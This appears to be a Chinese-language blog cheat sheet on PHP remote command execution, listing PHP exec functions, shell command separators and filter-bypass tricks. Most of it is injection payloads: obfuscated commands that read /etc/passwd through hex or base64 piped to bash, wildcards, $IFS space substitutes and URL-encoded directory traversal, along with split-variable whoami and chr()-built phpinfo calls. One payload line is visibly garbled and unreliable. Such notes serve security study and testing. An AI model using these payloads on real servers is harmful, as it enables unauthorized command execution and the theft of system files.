---
title: PHP命令执行
tags:
  - PHP
  - 命令执行
  - 漏洞原理
categories:
  - - 漏洞原理
description: 本文列举了以下常见的PHP命令执行函数
abbrlink: '96914696'
date: 2025-04-11 10:47:48
---

# RCE漏洞

服务器提供了执行有限命令的权限，但是没有对用户上传的参数做严格过滤，于是可通过一些手段执行多条命令

## 命令执行函数

exec() //必须使用echo输出，只输出最后一行

shell_exec() //必须使用echo输出

system()

popen()

反单引号 必须echo

obstart

mail+LD_RELOAD

proc_open

passthru

xss中可以使用``代替括号 alert`123`

sql注入诸如中可以使用``select`$_GET[name]` from table

## 执行方式

### windows:

| 不断路

|| 短路

&& 短路

& 不断路

### linux

; 分割不同的命令

## 过滤函数

shell_code

## 绕过姿势

**关键字过滤**

使用反斜线、单引号、变量拼接、base64编码

`ca\t$IFS/etc/passw'o'r\d` //能正常执行 必须跟绝对路劲

`a='l';b='s';$a$b`

`echo d2hvYW1p | base64 -d` //base64

`echo "0x636174202f6574632f706173737764" | xxd -r -p | bash` //十六进制

`$(printf "\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64")` //十六进制

*k* = ′*dd*′;{IFS}${9}{n\l,/etc$kkkkkkk$kkkkd/pa’s’sddks``}

**文件名过滤绕过**

使用通配符

`cat /???/passw*`

使用未声明的变量

`cat /etc$u/passwd`

使用通配

`cat /etc/pass[sdfkew]d`

使用cd命令目录穿越

`cd+..%26%26cd+..%26%26cd+..%26%26cd+..%26%26cd+etc%26%26cat+passwd`

windows系统

`((whoa^m""i))`

变量拼接：

`Whoami = a=who&&b=ami&&$a$b`

中间件命令执行使用替代函数

`phpinfo() = chr (80).chr (72).chr (80).chr (73).chr (78).chr (70).chr (79).chr (40).chr (41)`

`base_convert(27440799224,10,32)();`

**cat的替代命令**：

`cat more less head tac nl od vi vim uniq file -f sort bash -v  rev  strings curl file:///etc/passwd`

find 读取目录

**过滤空格绕过**

`$IFS $IFS$9 ${IFS}{cat,/etc/passwd}`

**连接符过滤**

`& | ; %0a`等连接符 挨个尝试